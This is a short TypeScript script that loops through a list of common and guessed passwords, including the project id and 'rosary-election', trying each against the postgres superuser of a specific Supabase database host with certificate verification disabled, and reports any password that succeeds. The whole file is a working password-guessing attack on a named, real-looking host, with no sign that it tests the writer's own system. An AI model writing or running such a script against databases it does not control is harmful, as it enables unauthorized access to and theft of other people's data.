import { Client } from "pg";

const host = "db.kiudoipalqvuxxbkcnaw.supabase.co";
const port = 5432;
const database = "postgres";
const user = "postgres";

const passwords = [
  "postgres",
  "kiudoipalqvuxxbkcnaw",
  "rosary-election",
  "rosary",
  "password",
  "admin",
  "1234"
];

async function tryConnect() {
  for (const password of passwords) {
    console.log(`Trying password: ${password}`);
    const client = new Client({
      host,
      port,
      database,
      user,
      password,
      ssl: { rejectUnauthorized: false }
    });
    try {
      await client.connect();
      console.log(`SUCCESS! Password is: ${password}`);
      await client.end();
      return;
    } catch (err: any) {
      console.log(`Failed: ${err.message}`);
    }
  }
  console.log("No common passwords worked.");
}

tryConnect();
